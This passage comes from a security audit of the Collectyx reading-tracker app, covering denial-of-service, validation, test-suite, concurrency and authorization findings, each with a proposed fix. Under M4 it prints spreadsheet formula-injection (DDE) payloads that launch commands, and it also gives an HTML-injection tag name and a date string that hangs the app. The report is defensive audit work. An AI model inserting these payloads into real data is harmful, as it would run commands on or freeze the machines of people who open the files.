     VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10)
     ON CONFLICT(id) DO UPDATE SET
        media_type_id = excluded.media_type_id,
        title   = CASE WHEN excluded.title != '' THEN excluded.title ELSE items.title END,
        pages   = CASE WHEN ?11 THEN excluded.pages ELSE items.pages END,
        isbn    = CASE WHEN ?12 THEN excluded.isbn  ELSE items.isbn  END,
        author  = CASE WHEN ?13 THEN excluded.author  ELSE items.author  END,
        author2 = CASE WHEN ?14 THEN excluded.author2 ELSE items.author2 END,
        modified = excluded.modified",
    params![
        item_id, owner, media_type_id, title,
        fields.author.clone().flatten(), fields.author2.clone().flatten(),
        fields.pages.flatten(), fields.isbn.clone().flatten(),
        date_added, now,
        fields.pages.is_some(),   // ?11 — key was present at all
        fields.isbn.is_some(),    // ?12
        fields.author.is_some(),  // ?13
        fields.author2.is_some(), // ?14
    ],
)?;
```

**Tracked as:** `COLLECTYX-SEC-08`

---

### M3 — Unbounded gap-fill loop in `generateStatistics()` hangs the app

**Severity:** Medium · **Confidence:** High · **Verified**

**Location:** `src/js/statistics.js:240–249`; `src/js/core.js:106–111`.

**Explanation**

```js
// statistics.js:240-249
const minYear = Math.min(...Object.keys(yearlyStats).map(Number));
const maxYear = Math.max(...Object.keys(yearlyStats).map(Number));
for (let year = minYear; year <= maxYear; year++) {
    if (!yearlyStats[year]) yearlyStats[year] = { books: 0, pages: 0 };
}
```

`year` comes from `getYearFromFinishedDate()`, which deliberately supports two
formats:

```js
// core.js:108-110
const parts = finishedDate.split('-');
const year = parts[0].length === 4 ? parts[0] : parts[2];
return parseInt(year);
```

The legacy `DD-MMM-YYYY` branch takes `parts[2]` with no length or range check.
`finished` is `TEXT NOT NULL` with no `CHECK` constraint, and neither
`replaceCollection` nor `replace_all_consumed` validates its format.

**Verified.**

```
  "2026-01-01"           -> year 2026
  "9999-12-31"           -> year 9999
  "01-Jan-99999999"      -> year 99999999      <-- legacy branch, unbounded
  "1-x-2000000000"       -> year 2000000000

resulting gap-fill span alongside one normal 2020 row
  "01-Jan-99999999"      -> 99,997,980 loop iterations
  "1-x-2000000000"       -> 1,999,997,981 loop iterations

measured
  span=  10,000,000  4088ms, 10,000,001 objects
```

CSV import is *not* a vector — `COLLECTION_IO_SPEC.consumed.fromRow` enforces
`/^\d{4}-\d{2}-\d{2}$/` on `Finished` (`collection-io.js:361`). Restore is, because
`replaceCollection` applies no validation on any path.

**Attack scenario**

A backup file with one `Consumed` record whose `Finished` is `"01-Jan-99999999"`.
Restore accepts it. The next time the user opens Statistics, the UI thread enters a
100-million-iteration allocation loop. Extrapolating from the measured 10M case:
~40 seconds of frozen UI and ~100M retained objects, which on a webview will hit
the heap limit and take the process down. It reproduces on every visit to
Statistics until the row is found and removed — and Statistics is one of the views
that will not load to let you find it.

**Impact**

Persistent denial of service, self-inflicted on every visit to the affected view.
Requires manual database surgery to escape.

**Recommended fix**

Validate at the boundary and defend at the loop. Both — the loop cap alone leaves
garbage in the database.

**Example corrected code**

```js
// core.js — reject out-of-range years at the parse site
const MIN_YEAR = 1000, MAX_YEAR = 2200;

function getYearFromFinishedDate(finishedDate) {
    if (!finishedDate) return null;
    const parts = String(finishedDate).split('-');
    if (parts.length !== 3) return null;
    const raw = parts[0].length === 4 ? parts[0] : parts[2];
    if (!/^\d{4}$/.test(raw)) return null;
    const year = parseInt(raw, 10);
    return (year >= MIN_YEAR && year <= MAX_YEAR) ? year : null;
}
```

```js
// statistics.js — drop unparseable years, then bound the fill
const datedBooks = consumed
    .filter(book => book.Finished)
    .map(book => ({ ...book, year: getYearFromFinishedDate(book.Finished) }))
    .filter(book => book.year !== null);

const MAX_CHART_YEARS = 200;
const years = Object.keys(yearlyStats).map(Number);
if (years.length > 0) {
    const minYear = Math.min(...years);
    const maxYear = Math.min(Math.max(...years), minYear + MAX_CHART_YEARS);
    for (let year = minYear; year <= maxYear; year++) {
        if (!yearlyStats[year]) yearlyStats[year] = { books: 0, pages: 0 };
    }
}
```

**Tracked as:** `COLLECTYX-SEC-09`

---

### M4 — CSV export is vulnerable to formula injection (CWE-1236)

**Severity:** Medium · **Confidence:** High · **Verified**

**Location:** `src/js/csv-utils.js:554–557` `_field()`; used by `toCSV()` at `:559`,
called from `CollectionIO.exportCSV()` at `collection-io.js:442`.

**Explanation**

```js
// csv-utils.js:554-557
_field(value) {
    const str = String(value == null ? '' : value);
    return /[",\n\r]/.test(str) ? '"' + str.replace(/"/g, '""') + '"' : str;
}
```

Quoting is correct for CSV structure and irrelevant to formula injection —
spreadsheet applications interpret a leading `=`, `+`, `-`, or `@` as a formula
whether or not the cell was quoted.

**Verified.**

```
Finished,Title,Author,Author2,Pages,ISBN,Rating,Comments,Tags
,=cmd|'/c calc.exe'!A1,a,,,,,,
,+2+5+cmd|' /C notepad'!A0,b,,,,,,
,@SUM(1+9)*cmd|'/c calc'!A0,c,,,,,,
,-2+3+cmd|'/c calc'!A0,d,,,,,,
  NEUTRALISED: false

round-trip: re-imported Title[0]: "=cmd|'/c calc.exe'!A1"
```

**Attack scenario**

A user imports a shared reading list containing a book whose Title is
`=cmd|'/c calc.exe'!A1`. Nothing rejects it (§M5). Later they export their Books
Read to CSV and open it in Excel, or send it to a friend who does. Excel prompts to
enable DDE; a meaningful fraction of users click through. On a locale where the
list separator differs, or in LibreOffice with default settings, the exposure
differs but the class is the same.

**Impact**

Command execution on the machine of whoever opens the exported CSV — which may be
someone other than the Collectyx user. Collectyx becomes the delivery vehicle.

**Recommended fix**

Prefix any field starting with a formula trigger with a single quote, and force
quoting on those fields. Guard the export side; §M5 covers the import side.

**Example corrected code**

```js
// csv-utils.js
_field(value) {
    let str = String(value == null ? '' : value);
    // CWE-1236: neutralise spreadsheet formula triggers, including the
    // leading-whitespace variants some parsers strip before evaluating.
    if (/^[\s]*[=+\-@\t\r]/.test(str)) {
        str = "'" + str;
    }
    return /[",\n\r']/.test(str) ? '"' + str.replace(/"/g, '""') + '"' : str;
}
```

**Tracked as:** `COLLECTYX-SEC-10`

---

### M5 — No validation on any write path; UI-only rules are bypassed by import and restore

**Severity:** Medium · **Confidence:** High

**Location:** `src-tauri/src/commands/common.rs:185–189` `reconcile_tags`;
`tags.rs:72` `save_tag`; `src/js/db-manager-web.js:213–215`;
`src/js/collection-io.js:351–366`; `src/js/backup-restore.js:274–276`.

**Explanation**

The frontend has real rules. `validateTagName()` (`tags.js:190–206`) enforces
`/^[a-z0-9_-]+$/i`. `DateUtils.parseDateInput()` range-checks month and day.
Every modal requires a non-empty Title.

None of them exist below the UI. The backends only trim and lowercase:

```rust
// common.rs:185-189
let mut wanted: Vec<String> = names.iter()
    .map(|n| n.trim().to_lowercase())
    .filter(|n| !n.is_empty())
    .collect();
```

So there is no enforcement at all on:

- **Tag name format** — the `[a-z0-9_-]` rule is browser-only. A restore file can
  create a tag named `<img src=x onerror=...>`, which is the delivery path for §C1.
- **Field length** — `Title`, `Author`, `Comments`, `Location`, `Patron`, and the
  settings JSON blob are unbounded. A 50 MB Title is accepted.
- **Date format** — `finished` is `TEXT NOT NULL` with no `CHECK`. This is the
  §M3 DoS.
- **Numeric range** — `pages` accepts any `i64`, including negatives.
- **Rating range** — `RatingUtils` defines 1–5; nothing enforces it.
- **`Title` non-empty** — `upsert_item` inserts `fields.title.unwrap_or_default()`,
  so a payload with no Title creates an item with `title = ''` in a `NOT NULL`
  column.
- **Payload size** — `handleImportFileSelected` does `await file.text()` with no
  cap; `replaceCollection` sends the whole array across IPC in one message.

**Attack scenario**

Every other data-driven finding routes through this one. It is the reason §C1 has a
delivery path, §M3 has a trigger, and §M4 has a payload source. Fixing validation
does not fix those findings, but it removes the cheapest route to each.

**Impact**

The application's stated data invariants hold only when data arrives through a form.
Import, restore, and direct IPC all bypass them.

**Recommended fix**

Validate in the backends, where every path converges — not in additional UI checks.
`CONSTANTS` should carry the limits so both backends and the UI share one definition.

**Example corrected code**

```rust
// common.rs — shared validators
pub const MAX_TEXT_LEN: usize = 500;
pub const MAX_COMMENT_LEN: usize = 10_000;

pub fn validate_tag_name(name: &str) -> Result<String, String> {
    let clean = name.trim().to_lowercase();
    if clean.is_empty() { return Err("Tag name cannot be empty".into()); }
    if clean.len() > 64 { return Err("Tag name is too long (max 64)".into()); }
    if !clean.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
        return Err(format!("Tag \"{}\" contains invalid characters", clean));
    }
    Ok(clean)
}

pub fn validate_date(value: &str, field: &str) -> Result<(), String> {
    let b = value.as_bytes();
    let shaped = b.len() == 10
        && b[4] == b'-' && b[7] == b'-'
        && b.iter().enumerate().all(|(i, c)| i == 4 || i == 7 || c.is_ascii_digit());
    if !shaped { return Err(format!("{} must be YYYY-MM-DD", field)); }
    let year: i32 = value[0..4].parse().map_err(|_| format!("{}: bad year", field))?;
    if !(1000..=2200).contains(&year) { return Err(format!("{}: year out of range", field)); }
    Ok(())
}

pub fn validate_item_fields(f: &ItemFields) -> Result<(), String> {
    let title = f.title.as_deref().unwrap_or("").trim();
    if title.is_empty() { return Err("Title is required".into()); }
    if title.len() > MAX_TEXT_LEN { return Err("Title is too long".into()); }
    for (label, v) in [("Author", &f.author), ("Author2", &f.author2), ("ISBN", &f.isbn)] {
        if let Some(s) = v {
            if s.len() > MAX_TEXT_LEN { return Err(format!("{} is too long", label)); }
        }
    }
    if let Some(p) = f.pages {
        if !(0..=100_000).contains(&p) { return Err("Pages out of range".into()); }
    }
    Ok(())
}
```

```rust
// reconcile_tags — reject rather than silently accept
let mut wanted: Vec<String> = Vec::new();
for n in names {
    match validate_tag_name(n) {
        Ok(clean) => wanted.push(clean),
        Err(e) => return Err(rusqlite::Error::InvalidParameterName(e)),
    }
}
wanted.sort();
wanted.dedup();
```

**Tracked as:** `COLLECTYX-SEC-11`

---

### M6 — The test suite is broken: 4 of 6 suites fail, and one was never correct

**Severity:** Medium · **Confidence:** High · **Verified**

**Location:** `tests/schema-test.js:23–34`, `tests/migration-test.js:17–29`,
`tests/rust-sql-test.js:27–29`, `tests/join-test.js`, `tests/web-backend-test.js`.

**Explanation**

**Verified** by running `node tests/run-all.js` on Node 22.22.2:

```
schema-test.js        PASS
migration-test.js     FAIL  expected 8 tables, got 9
join-test.js          FAIL  CONSTANTS.STORES has eight entries
web-backend-test.js   FAIL  all eight stores created
parity-test.js        PASS
rust-sql-test.js      FAIL  queued: no such column: q.currently_reading

4 suite(s) failed
```

Three of the four are staleness — schema v2 added `app_meta` (nine stores, not
eight) and `queued.currently_reading`, and the assertions were never updated.

`migration-test.js` is a different problem. Its extraction regex is not scoped to a
function:

```js
const order = [...migSrc.matchAll(/schema::(\w+),/g)].map(x => x[1]);
```

That scans the whole of `migrations.rs`, so it pulls `CREATE_APP_META` out of
`migrate_v2()` and splices it into the batch it believes `migrate_v1()` builds. Its
placeholder-count assertion then passes by coincidence — 10 placeholders in v1 plus
1 in v2 equals the 11 arguments it collected across both functions. The test has
never actually verified what it claims to.

The cost is concrete. `rust-sql-test.js` throws at the `queued` case, so the
column-index alignment check — the one that would catch an off-by-one between a
`SELECT` list and its `row.get(N)` calls — never runs for `queued` or `owned`. I
verified those indices by hand and they are correct today, but nothing is checking
them, and `row_to_record` reads item timestamps out of order (indices 14/15 in
`queued`, 15/16 in `consumed` and `owned`), which is exactly where such a bug hides.

**Attack scenario**

No attacker. This is the mechanism that would have caught §H1's owner scoping (the
suite has two-owner fixtures), §M2's COALESCE divergence (`web-backend-test.js`
covers partial-payload preservation), and §M1's ID quality. It has been red for
long enough that a red run carries no signal.

**Impact**

No regression safety net. Every fix in this report ships without automated
verification until the suite is repaired.

**Recommended fix**

Repair the suite first, before any other change in this report — it is the thing
that will verify the rest.

**Example corrected code**

```js
// migration-test.js — scope extraction to one function body
function migrationBody(src, fnName) {
    const start = src.indexOf(`fn ${fnName}(`);
    if (start === -1) throw new Error(`${fnName} not found in migrations.rs`);
    const open = src.indexOf('{', start);
    let depth = 0, i = open;
    for (; i < src.length; i++) {
        if (src[i] === '{') depth++;
        else if (src[i] === '}' && --depth === 0) break;
    }
    return src.slice(open, i + 1);
}

const v1 = migrationBody(migSrc, 'migrate_v1');
const order = [...v1.matchAll(/schema::(\w+),/g)].map(x => x[1]);
const placeholders = (v1.match(/^\s{8}\{\}$/gm) || []).length;
```

```js
// derive the expected table set from the source instead of hard-coding a count
const expectedTables = Object.keys(consts)
    .filter(k => k.startsWith('CREATE_') && k !== 'CREATE_INDEXES')
    .map(k => consts[k].match(/CREATE TABLE IF NOT EXISTS (\w+)/)[1])
    .sort();
```

```js
// rust-sql-test.js — apply migration v2 before preparing queued's SELECT_JOINED
db.exec(consts.CREATE_APP_META);
db.exec('ALTER TABLE queued ADD COLUMN currently_reading INTEGER NOT NULL DEFAULT 0;');
```

**Tracked as:** `COLLECTYX-SEC-12`

---

### M7 — Rank shifting is non-atomic and O(n²)

**Severity:** Medium · **Confidence:** High

**Location:** `src/js/queued-modal.js:291–321` `_shiftRanksAfterSave()`, `:343–350`;
`src/js/db-manager-tauri.js:94–105` `saveCollectionRecord()`.

**Explanation**

Reordering the To Be Read list issues one independent write per affected row:

```js
// queued-modal.js:318-320
for (const s of shifts) {
    await DBManager.saveCollectionRecord('queued', { id: s.id, ItemId: s.ItemId, Rank: s.Rank });
}
```

Two problems.

**Atomicity.** Each iteration commits separately. A failure or a close partway
through leaves the list with duplicate or gapped ranks, and nothing detects or
repairs it — `save()` has already reported success and closed the modal
(`queued-modal.js:275–278` awaits the shift but the record itself is committed
first).

**Cost.** On Tauri, each `saveCollectionRecord` first calls `getCollectionRecord`,
which calls `getCollection`, which invokes `get_all_queued` — a full join over the
entire table, serialised across IPC:

```js
// db-manager-tauri.js:87-90
async getCollectionRecord(collection, id) {
    const all = await this.getCollection(collection);    // full table read
    return all.find(r => r.id === id) || null;
}
```

Inserting at rank 1 in a list of *n* ranked items produces *n* shifts, each doing a
full *n*-row read plus a write: O(n²) rows serialised across IPC. At n = 1000 that
is roughly a million record serialisations for one drag.

The shift set is also computed from `allBefore`, a snapshot taken *before* the save
(`queued-modal.js:247`), so any concurrent change is silently overwritten.

**Impact**

Rank corruption on interruption; a UI freeze proportional to the square of the list
size on the desktop build.

**Recommended fix**

Add a `reorder_queued` Rust command that performs the whole shift in one
transaction, and have the web backend do the same in one `_rawWrite`. The
`replace_all_*` commands already establish this shape.

**Example corrected code**

```rust
// queued.rs
#[tauri::command]
pub fn reorder_queued(
    state: State<AppState>, id: String, new_rank: Option<i64>,
) -> Result<(), String> {
    let mut db = state.db.lock().map_err(|e| e.to_string())?;
    let owner = common::current_owner(&db);
    let tx = db.transaction().map_err(|e| e.to_string())?;
    let now = today();

    let old_rank: Option<i64> = tx.query_row(
        "SELECT q.\"rank\" FROM queued q JOIN items i ON i.id = q.item_id
          WHERE q.id = ?1 AND i.owner = ?2",
        params![id, owner], |r| r.get(0),
    ).map_err(|e| e.to_string())?;

    let scope = "item_id IN (SELECT id FROM items WHERE owner = ?1)";
    match (old_rank, new_rank) {
        (None, Some(n)) => { tx.execute(&format!(
            "UPDATE queued SET \"rank\" = \"rank\" + 1, modified = ?2
              WHERE {} AND \"rank\" >= ?3 AND id <> ?4", scope),
            params![owner, now, n, id]).map_err(|e| e.to_string())?; }
        (Some(o), Some(n)) if n > o => { tx.execute(&format!(
            "UPDATE queued SET \"rank\" = \"rank\" - 1, modified = ?2
              WHERE {} AND \"rank\" > ?3 AND \"rank\" <= ?4 AND id <> ?5", scope),
            params![owner, now, o, n, id]).map_err(|e| e.to_string())?; }
        (Some(o), Some(n)) if n < o => { tx.execute(&format!(
            "UPDATE queued SET \"rank\" = \"rank\" + 1, modified = ?2
              WHERE {} AND \"rank\" >= ?3 AND \"rank\" < ?4 AND id <> ?5", scope),
            params![owner, now, n, o, id]).map_err(|e| e.to_string())?; }
        (Some(o), None) => { tx.execute(&format!(
            "UPDATE queued SET \"rank\" = \"rank\" - 1, modified = ?2
              WHERE {} AND \"rank\" > ?3", scope),
            params![owner, now, o]).map_err(|e| e.to_string())?; }
        (None, None) => {}
    }

    tx.execute("UPDATE queued SET \"rank\" = ?1, modified = ?2 WHERE id = ?3",
               params![new_rank, now, id]).map_err(|e| e.to_string())?;
    tx.commit().map_err(|e| e.to_string())
}
```

**Tracked as:** `COLLECTYX-SEC-13`

---

### M8 — `replaceAllTags` behaves differently on each backend; SQLite silently destroys tag links

**Severity:** Medium · **Confidence:** High

**Location:** `src-tauri/src/commands/tags.rs:152–182`;
`src/js/db-manager-web.js:903–932`; `src-tauri/src/db/schema.rs:92`.

**Explanation**

`item_tags.tag_id` carries `ON DELETE CASCADE` (`schema.rs:92`). So the Rust
`replace_all_tags` does this:

```rust
tx.execute("DELETE FROM tags WHERE owner = ?1", params![owner])   // cascades away
                                                                  // every item_tags row
// ...then re-inserts the tag rows, but the links are already gone
```

Even when the incoming tags carry their original ids, the junction rows they were
referenced by no longer exist. Every book's tags are silently cleared.

The web backend does the opposite: it deletes the tag rows and leaves `item_tags`
untouched, producing dangling junction rows. `tagNamesByItem` skips links whose tag
is missing (`db-manager-web.js:76–77`), so they are invisible — and if the tags are
re-inserted with the same ids, the links *reattach*. So the same call clears all
tags on desktop and preserves them on web.

Both are wrong, in opposite directions.

**Attack scenario**

`grep` shows no current caller — `replaceAllTags` is part of the documented
`DBManager` surface (design doc §6.1) with no code path reaching it today. That
keeps this latent, so it is a bug waiting for its first use rather than a live
defect. It is on the documented surface, so the first thing to use it (a future
Scriptum importer, or a restore rewrite for §C2) will hit it.

**Impact**

Silent loss of every tag association on the desktop build the first time this is
called; divergent behaviour between backends for an operation the design document
specifies as identical.

**Recommended fix**

Rewrite the tag rows in place rather than deleting and re-adding, so cascade never
fires. Fix the web side to keep `item_tags` consistent with the tags that survive.

**Example corrected code**

```rust
// tags.rs — replace_all_tags without triggering the cascade
let incoming: Vec<(String, String)> = tags.iter()
    .filter_map(|t| {
        let name = t.name.trim().to_lowercase();
        if name.is_empty() { None }
        else { Some((t.id.clone().unwrap_or_else(new_uuid), name)) }
    })
    .collect();

let keep: Vec<&String> = incoming.iter().map(|(id, _)| id).collect();

// Delete only the tags that are genuinely going away; their links should
// cascade, because those tags no longer exist.
let mut stmt = tx.prepare("SELECT id FROM tags WHERE owner = ?1")?;
let existing: Vec<String> = stmt.query_map(params![owner], |r| r.get(0))?
    .collect::<Result<Vec<_>>>()?;
drop(stmt);
for id in existing.iter().filter(|id| !keep.contains(id)) {
    tx.execute("DELETE FROM tags WHERE id = ?1", params![id])?;
}

// Upsert the survivors in place — no delete, so no cascade.
for (id, name) in &incoming {
    tx.execute(
        "INSERT INTO tags (id, owner, name, date_added, modified)
         VALUES (?1,?2,?3,?4,?5)
         ON CONFLICT(id) DO UPDATE SET name = excluded.name, modified = excluded.modified",
        params![id, owner, name, now, now],
    )?;
}
```

```js
// db-manager-web.js — mirror it: drop the junction rows of removed tags only
const keep = new Set((tagList || []).map(t => t.id).filter(Boolean));
const itemTags = await this._load(S.ITEM_TAGS);
existing.filter(t => t.owner === owner && !keep.has(t.id)).forEach(t => {
    ops.push({ store: S.TAGS, action: 'delete', key: t.id });
    itemTags.filter(l => l.tag_id === t.id).forEach(l => ops.push({
        store: S.ITEM_TAGS, action: 'delete', key: [l.item_id, l.tag_id],
    }));
});
```

**Tracked as:** `COLLECTYX-SEC-14`

---

### M9 — Web cache is mutated before the write commits and is not invalidated on failure

**Severity:** Medium · **Confidence:** High

**Location:** `src/js/db-manager-web.js:627–643`; `JoinHelpers.reconcileTags` at
`:252–255`; `_load()` at `:428–433`.

**Explanation**

`_load()` returns the cached array **by reference**:

```js
async _load(storeName) {
    if (!this._cache[storeName]) this._cache[storeName] = await this._rawGetAll(storeName);
    return this._cache[storeName];    // caller gets the live cache
}
```

`reconcileTags` then mutates objects inside it:

```js
} else if (alreadyLinked && !alreadyLinked.has(tag.id)) {
    tag.modified = today;             // mutating a cached object
    touchedTags.push(tag);
}
```

That mutation happens *before* the write, and `_invalidate()` runs *after* it:

```js
await this._rawWrite([S.ITEMS, collection, S.TAGS, S.ITEM_TAGS], ops);
this._invalidate(S.ITEMS, collection, S.TAGS, S.ITEM_TAGS);   // skipped if the write throws
```

If `_rawWrite` rejects — quota exceeded, transaction aborted, the tab going to
`bfcache` mid-transaction — the mutation stays in the cache and the invalidation
never runs. The in-memory store now reports a `modified` date that was never
persisted, and keeps reporting it until something else clears that cache entry.

There is a second race in the same function. The reads (`_load`) happen in
independent readonly transactions, and the write happens in a later one. Two
overlapping `saveCollectionRecord` calls both read the pre-write state and the
second clobbers the first. Nothing serialises them.

**Impact**

The Tags view's Last Updated column can show values that do not exist on disk and
survive a re-render but not a reload. Concurrent saves can lose an update
silently.

**Recommended fix**

Do not hand out cache references, and invalidate on failure as well as success.

**Example corrected code**

```js
// db-manager-web.js — invalidate on both paths
try {
    await this._rawWrite([S.ITEMS, collection, S.TAGS, S.ITEM_TAGS], ops);
} finally {
    // The cache is dirty either way: reconcileTags mutates the objects it is
    // given, and those came from the cache.
    this._invalidate(S.ITEMS, collection, S.TAGS, S.ITEM_TAGS);
}
```

```js
// JoinHelpers.reconcileTags — return a copy rather than mutating the input
} else if (alreadyLinked && !alreadyLinked.has(tag.id)) {
    const bumped = Object.assign({}, tag, { modified: today });
    byName.set(name, bumped);
    touchedTags.push(bumped);
    tag = bumped;
}
```

**Tracked as:** `COLLECTYX-SEC-15`

---

### M10 — Owner (Testing) ships an unauthenticated data-scope switch

**Severity:** Medium · **Confidence:** High

**Location:** `src/js/settings.js:151–202` `OwnerTestModal`;
`src-tauri/src/commands/app_meta.rs:30–39` `set_app_meta`;
`src/js/db-manager-web.js:1037–1051`; `src/index.html` (Settings modal).

**Explanation**

`OwnerTestModal.save()` writes any string the user types into `app_meta.current_owner`
and reloads. `current_owner()` (`common.rs:86–93`) is what every read command scopes
to. So a free-text field with no credential selects which owner's data the
application returns.

`set_app_meta` accepts any key and any value, from any IPC caller.

The comments are candid — `app_meta` exists specifically so a *"real auth mechanism
(session token, API key hash)"* can reuse it. The concern is that the control shipped
in a user-facing Settings modal, and the pattern it establishes (owner is a
client-supplied string with no verification) is the thing that becomes an
authentication bypass the moment D1 sync makes owners real.

**Attack scenario**

Locally, IndexedDB is per-origin and SQLite is per-machine, so switching owners only
partitions your own data. The real exposure is architectural: this is a working
implementation of "the client chooses which tenant's data to read," and §H2's
unscoped writes are its natural companion.

**Impact**

Today: a debug control in a shipped build, and a route to §H1's cross-owner wipe.
Under D1: the primary authentication bypass.

**Recommended fix**

Put it behind a build flag so it cannot appear in a release, and restrict
`set_app_meta` to an allow-list of keys so it cannot become a general-purpose
client-writable key/value store.

**Example corrected code**

```js
// constants.js
    // Debug-only surfaces. Must be false in every released build.
    ENABLE_OWNER_TEST_SWITCH: false,
```

```js
// settings.js — SettingsModal._bindEvents()
else if (action === 'open-owner-test') {
    if (!CONSTANTS.ENABLE_OWNER_TEST_SWITCH) return;
    OwnerTestModal.open();
}

// settings.js — SettingsModal.open()
const ownerTestRow = document.getElementById('settingsOwnerTestRow');
if (ownerTestRow) {
    ownerTestRow.style.display = CONSTANTS.ENABLE_OWNER_TEST_SWITCH ? '' : 'none';
}
```

```rust
// app_meta.rs — do not accept arbitrary keys from the client
const WRITABLE_KEYS: &[&str] = &[crate::constants::APP_META_CURRENT_OWNER_KEY];

#[tauri::command]
pub fn set_app_meta(state: State<AppState>, key: String, value: String) -> Result<(), String> {
    if !WRITABLE_KEYS.contains(&key.as_str()) {
        return Err(format!("app_meta key \"{}\" is not writable", key));
    }
    if value.len() > 256 { return Err("Value too long".into()); }
    let db = state.db.lock().map_err(|e| e.to_string())?;
    db.execute(
        "INSERT INTO app_meta (key, value) VALUES (?1, ?2)
         ON CONFLICT(key) DO UPDATE SET value = excluded.value",
        params![key, value],
    ).map_err(|e| e.to_string())?;
    Ok(())
}
```

**Tracked as:** `COLLECTYX-SEC-16`

---

### L1 — `_wired = true` set before the element lookup; a failed bind is permanent and `Confirm` hangs forever

**Severity:** Low · **Confidence:** High · **Verified**

**Location:** `src/js/confirm.js:15–27`; the same shape in `consumed-modal.js:31`,
`queued-modal.js:189`, `owned-modal.js:387`, `owned-view.js:137`,
`settings.js:12` and `:153`, `backup-restore.js:89`, `collection-io.js:455`.

**Explanation**

```js
// confirm.js:15-26
_bindEvents() {
    if (this._wired) return;
    this._wired = true;                                   // <-- set first
    const modal = document.getElementById('confirmModal');
    if (!modal) return;                                   // <-- bails, but _wired is now true
    modal.addEventListener('click', ...);
}
```

If the element is missing on the first call, the guard is latched and the listeners
are never attached — on this or any subsequent call. For `Confirm` the consequence
is worse than a dead button:

```js
open(message, confirmLabel) {
    this._bindEvents();
    // ...
    return new Promise((resolve) => { this._resolve = resolve; });
}
```

With no listeners, nothing ever calls `_settle()`, so the Promise never resolves.
`if (!await Confirm.open('Delete this record?', 'Delete')) return;` blocks forever,
the modal stays open with inert buttons, and the calling async function is
suspended permanently.

Two modules in the codebase already do this correctly — `TagsView._bindEvents`
(`tags.js:254–273`) sets `this._bound = true` at the end, and
`CollectionView._bindEvents` (`collection-view.js:41–78`) sets
`_boundContainers[containerId]` at the end. The correct pattern is present; eight
modules just do not follow it.

All the referenced ids exist in `index.html` today, so this is latent rather than
live. It becomes live on any markup change, id rename, or partial DOM load.

**Impact**

Latent. If triggered: permanently non-functional confirm dialogs and a suspended
async chain, presenting as an app that stops responding to Delete with no error.

**Recommended fix**

Set the guard last in all eight, and give `Confirm.open()` a fail-closed path.

**Example corrected code**

```js
// confirm.js
_bindEvents() {
    if (this._wired) return;
    const modal = document.getElementById('confirmModal');
    if (!modal) return;                 // do not latch — retry on the next call
    modal.addEventListener('click', (event) => {
        const btn = event.target.closest('[data-action]');
        if (!btn || !modal.contains(btn)) return;
        const action = btn.dataset.action;
        if (action === 'confirm') this._settle(true);
        else if (action === 'cancel') this._settle(false);
    });
    this._wired = true;                 // only once the listener is genuinely attached
},

open(message, confirmLabel) {
    this._bindEvents();
    if (!this._wired) {
        // Fail closed: a confirm that cannot be answered must read as "cancel",
        // never as a Promise the caller waits on forever.
        console.error('Confirm: modal unavailable; treating as cancelled');
        return Promise.resolve(false);
    }
    if (this._resolve) this._settle(false);
    // ...rest unchanged
}
```

**Tracked as:** `COLLECTYX-SEC-17`

---

### L2 — `today()` is UTC in Rust and local in JavaScript

**Severity:** Low · **Confidence:** High · **Verified**

**Location:** `src-tauri/src/commands/common.rs:54–75`;
`src/js/core.js:259–265` `MediaLabels.todayISO()`;
`src/js/db-manager-web.js:499–504` `_today()`.

**Explanation**

The civil-from-days arithmetic is correct — **verified** against every day from 1990
to 2040 with zero mismatches. The problem is the reference frame. Rust derives the
date from epoch seconds, which is UTC. Both JavaScript helpers use
`getFullYear()`/`getMonth()`/`getDate()`, which are local.

**Verified.**

```
at 2026-08-07 20:30 UTC, a user in Pacific/Auckland (UTC+12):
    Rust writes date_added/modified = 2026-08-07
    JS   writes Finished/CheckedOutDate = 2026-08-08   -> differ: True
```

So a New Zealand user finishing a book on the morning of the 8th gets
`Finished = 2026-08-08` (from JS) and `date_added = 2026-08-07` (from Rust) on the
same row. `Finished` also drives the Dashboard's this-year counts and the Statistics
year buckets, which are computed against the local year — so a book finished on
1 January can land in the previous year's bucket for users east of UTC.

Separately, `.unwrap_or(0)` at `common.rs:59` silently yields `1970-01-01` if the
clock cannot be read, rather than failing.

**Impact**

Off-by-one dates for users in positive UTC offsets; the same save produces different
stamps on the desktop and web builds.

**Recommended fix**

Pick one frame. Since `Finished` and `CheckedOutDate` are user-facing calendar dates,
local is the correct choice; pass the client's date across IPC rather than
recomputing it in Rust.

**Example corrected code**

```rust
// common.rs — take the caller's local date, fall back to UTC only if absent
pub fn resolve_today(client_today: &Option<String>) -> String {
    match client_today {
        Some(d) if validate_date(d, "today").is_ok() => d.clone(),
        _ => today_utc(),
    }
}
```

```rust
// consumed.rs — carry it on the payload
#[serde(rename = "ClientToday", default)]
pub client_today: Option<String>,

// save_consumed
let now = common::resolve_today(&record.client_today);
```

```js
// db-manager-tauri.js — send it on every write
async saveCollectionRecord(collection, record) {
    let complete = record;
    if (record.id) {
        const existing = await this.getCollectionRecord(collection, record.id);
        if (existing) complete = Object.assign({}, existing, record);
    }
    complete = Object.assign({}, complete, { ClientToday: MediaLabels.todayISO() });
    const id = await invoke(this._commands(collection).save, { record: complete });
    return { id: id, ItemId: complete.ItemId || null };
}
```

**Tracked as:** `COLLECTYX-SEC-18`

---

### L3 — Assorted hardening and hygiene

**Severity:** Low · **Confidence:** High (each item verified by reading; reachability noted per item)

Grouped because each is small and they share a review pass.

**a) Unescaped `t.id` in the tag-substitute dropdown.**
`src/js/tags.js:483` — `<option value="${t.id}">${escapeHtml(t.Name)}</option>`.
The name is escaped; the id is not. Tag ids are backend-generated today
(`new_uuid()` or `crypto.randomUUID()`), and the one path that could carry a
file-supplied id — `replaceAllTags` — has no caller (§M8), so this is **not
currently reachable**. *Requires Verification* if a future importer preserves tag
ids from a file. Fix regardless:
```js
others.map(t => `<option value="${escapeHtml(t.id)}">${escapeHtml(t.Name)}</option>`).join('');
```

**b) Tauri CSP lacks `object-src`, `base-uri`, and `form-action`.**
`tauri.conf.json` sets `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost`.
`object-src` falls back to `default-src`, so that one is covered, but `base-uri` and
`form-action` have no fallback. With HTML injection, an attacker can inject
`<base href>` to repoint relative URLs or a `<form action>` posting off-origin.
`script-src 'self'` limits the damage since 'self' is evaluated against the document
origin rather than the base, but both directives are free:
```json
